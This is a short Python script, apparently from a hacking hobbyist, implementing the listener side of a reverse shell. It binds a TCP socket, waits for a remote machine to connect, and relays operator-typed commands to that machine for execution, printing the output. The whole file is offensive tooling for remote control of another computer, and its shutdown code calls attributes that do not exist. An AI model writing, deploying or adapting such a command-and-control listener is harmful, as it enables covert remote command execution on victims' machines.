"""
Author: @dreamhacker //
"""

import socket
import sys
from threading import Thread

class Server:
	#initialize variables
	def __init__(self):
		try:
			#server host address
			self.host  = sys.argv[1]
			#server port address
			self.port = int(sys.argv[2])
			#initialize a server socket
			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			#prevents from getting timeout issues
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		except:
			print("[!] Error creating socket.")
			print("[-] Try changing host and port address.")
			print("[-] Or check whats wrong with your system. xD")
			print("[*] Exiting......")
			sys.exit(0)

		print("[*] Application Initialized.")
		print("[*] Host:", self.host,"Port:", self.port)

	def bind(self):
		try:
			#bind server to host and port
			self.server.bind((self.host, self.port))
			print("[*] Bind socket to host successful.")
			#start listening to connections
			self.server.listen(5)
			print("[*] Listening started on", self.host, ":", self.port)
		except:
			"""
			If the binding has failed. Bind method is called continuously
			until a bind is successful.
			"""
			print("[!] Error binding socket to port.")
			print("[-] Try changing host and port address.")
			print("[-] Or check whats wrong with your system. xD")
			print("[-] Or we will keep retrying to bind.")
			print("[*] Retrying.....")
			self.bind()

	def accept_connection(self):
		"""
		When any new connection is made to the socket
		server. A connection and address is returned by accept
		method 
		"""
		connection, addr = self.server.accept()
		print("Connected to: {0}:{1}".format(addr[0], addr[1]))
		
		#Call the method to send commans to remote host.	
		self.run_commands(connection)
		#Close the socket connection
		connection.close()

	def run_commands(self, connection):
		""" 
		Loops constantly to get commands and send it to the
		remote host to execute. Along with the response is printed 
		out which is received from the remote host.
		"""	
		while True:
			 command = input()
			 if command in ['end', 'close', 'halt', 'End', 'Close', 'Halt', 'quit', 'Quit']:
			 	op = input("[!] Do you really want to close server socket? (y/n): ")
			 	if op in ['Yes', 'yes', 'y']:
			 		self.connection.close()
			 		print("[*] Closing connection with remote device.")
			 		self.socket.close()
			 		print("[*] Closing socket on host device.")
			 		print("[*] Exiting......")
			 		sys.exit()

			 """
			 Given command is encoded into bytes so that 
			 string can be sent over network. Checking if the 
			 byte is greater than 0 for not sending blank data over network
			 """
			 if len(str.encode(command)) > 0:
			 	#sending the command to the remote device.
			 	connection.send(str.encode(command))
			 	#get response from remote device.
			 	#buffer size: 1024
			 	#convert it to utf-8
			 	response = str(connection.recv(1024), 'utf-8')
			 	#end="" is used not to get a new line character.
			 	print(response, end="")




server = Server()
server.bind()
server.accept_connection()
	